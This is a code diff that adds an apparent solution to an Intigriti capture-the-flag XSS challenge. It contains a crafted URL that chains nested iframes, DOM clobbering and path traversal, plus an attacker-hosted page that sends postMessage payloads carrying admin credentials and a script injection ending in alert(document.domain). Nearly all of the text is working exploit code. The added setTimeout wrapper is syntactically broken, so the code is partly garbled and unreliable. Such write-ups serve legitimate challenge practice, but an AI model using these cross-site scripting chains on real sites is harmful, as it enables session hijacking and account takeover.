@@ -1,3 +1,15 @@
+
+/"URL TO VISIT"/
+
+
+
+https://challenge-0721.intigriti.io/htmledit.php?code=%3Ciframe%20srcdoc=%22%20%3Ciframe%20srcdoc=%27%20%3Ca%20id=admin%20href=https://admin:admin@admin.com?(%23sdf%3Cb%3Esdfsdf%20%27%20name=%27users%27%3E%3C/iframe%3E%20%22%20name=%27store%27%3E%3C/iframe%3E%3Cdiv%20id=DEV%3Esd%3C/div%3E%3Ciframe%20src=%22./%3Cb%3E%2f../console.php?x=%3Cb%3Esdfsdfsf%23%3C%3E%22%3E%3C/iframe%3E%3Ciframe%20src=%22https://structhack.github.io/%22%3E%3C/iframe%3E
+
+
+
+
+
+/*EXPLOIT ON THE https://structhack.github.io*/
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,9 +19,11 @@
 	aaaa
 	<script type="text/javascript">
 		window.onload = ()=>{
+			setTimeout()=>{
 			top.frames[1].postMessage({credentials:{username:"admin",password:"admin"},cmd:"log",message:{text:"sss",type:"<iframe srcdoc='<script src=\"./analytics%2f..%2fhtmledit.php?code=%0Aalert(document.domain)/*%0A\">alert()/*<\/script>'><\/iframe>"}}, '*');
 
 			top.frames[1].postMessage({credentials:{username:"admin",password:"admin"},cmd:"logv",message:"type"}, '*');
+			,3000}
 		}
 	</script>
 </body>
